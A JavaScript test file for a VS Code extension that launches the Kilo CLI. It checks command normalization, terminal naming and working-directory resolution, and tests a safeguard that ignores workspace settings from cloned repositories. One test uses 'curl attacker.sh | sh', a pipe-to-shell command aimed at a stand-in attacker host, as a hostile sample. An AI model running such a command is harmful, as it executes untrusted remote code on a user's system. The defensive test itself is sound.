const test = require('node:test');
const assert = require('node:assert/strict');

const {
  normalizeCliCommand,
  buildTerminalName,
  buildExtensionSettingsQuery,
  resolveCliCommandSetting,
  resolveTerminalCwd,
} = require('../out/command-utils.js');

// The resolved command is sent straight to a terminal. `configuration.get()`
// also resolves workspace values, so a cloned repo shipping a .vscode/settings.json
// could pick the command that runs on the first toolbar click. These cover the
// user-level-only contract that keeps that from happening.
test('resolveCliCommandSetting prefers the user-level value', () => {
  assert.equal(
    resolveCliCommandSetting({ defaultValue: 'kilo', globalValue: 'kilo --verbose' }),
    'kilo --verbose',
  );
});

test('resolveCliCommandSetting ignores workspace-controlled values', () => {
  // A workspaceValue/workspaceFolderValue is never read, so a hostile repo
  // cannot substitute the command.
  assert.equal(
    resolveCliCommandSetting({
      defaultValue: 'kilo',
      workspaceValue: 'curl attacker.sh | sh',
      workspaceFolderValue: 'curl attacker.sh | sh',
    }),
    'kilo',
  );
});

test('resolveCliCommandSetting falls back when inspection is undefined', () => {
  assert.equal(resolveCliCommandSetting(undefined), 'kilo');
});

test('normalizeCliCommand trims configured values', () => {
  assert.equal(normalizeCliCommand('  kilo --help  '), 'kilo --help');
});

test('normalizeCliCommand falls back when value is undefined', () => {
  assert.equal(normalizeCliCommand(undefined), 'kilo');
});

test('normalizeCliCommand preserves the blank command path for validation', () => {
  assert.equal(normalizeCliCommand('   '), '');
});

test('buildTerminalName uses the base name for the first terminal', () => {
  assert.equal(buildTerminalName('  Kilo CLI  ', 1), 'Kilo CLI');
});

test('buildTerminalName appends the sequence after the first terminal', () => {
  assert.equal(buildTerminalName('Kilo CLI', 3), 'Kilo CLI 3');
});

test('buildTerminalName falls back when the configured name is blank', () => {
  assert.equal(buildTerminalName('   ', 2), 'Kilo CLI 2');
});

test('buildExtensionSettingsQuery targets the current extension id', () => {
  assert.equal(buildExtensionSettingsQuery('mikesoft.vscode-kilo-cli-launcher'), '@ext:mikesoft.vscode-kilo-cli-launcher');
});

test('resolveTerminalCwd uses the active editor workspace when available', () => {
  const workspace = {
    workspaceFolders: [
      { uri: 'workspace-a' },
      { uri: 'workspace-b' },
    ],
    getWorkspaceFolder(uri) {
      return uri === 'file-b' ? { uri: 'workspace-b' } : undefined;
    },
  };

  const activeEditor = {
    document: {
      uri: 'file-b',
    },
  };

  assert.equal(resolveTerminalCwd(activeEditor, workspace), 'workspace-b');
});

test('resolveTerminalCwd falls back to the first workspace when the active editor is outside the workspace', () => {
  const workspace = {
    workspaceFolders: [
      { uri: 'workspace-a' },
      { uri: 'workspace-b' },
    ],
    getWorkspaceFolder() {
      return undefined;
    },
  };

  const activeEditor = {
    document: {
      uri: 'external-file',
    },
  };

  assert.equal(resolveTerminalCwd(activeEditor, workspace), 'workspace-a');
});

test('resolveTerminalCwd falls back to the first workspace when there is no active editor', () => {
  const workspace = {
    workspaceFolders: [
      { uri: 'workspace-a' },
      { uri: 'workspace-b' },
    ],
    getWorkspaceFolder() {
      return undefined;
    },
  };

  assert.equal(resolveTerminalCwd(undefined, workspace), 'workspace-a');
});

test('resolveTerminalCwd returns undefined when no workspace is open', () => {
  const workspace = {
    workspaceFolders: undefined,
    getWorkspaceFolder() {
      return undefined;
    },
  };

  assert.equal(resolveTerminalCwd(undefined, workspace), undefined);
});
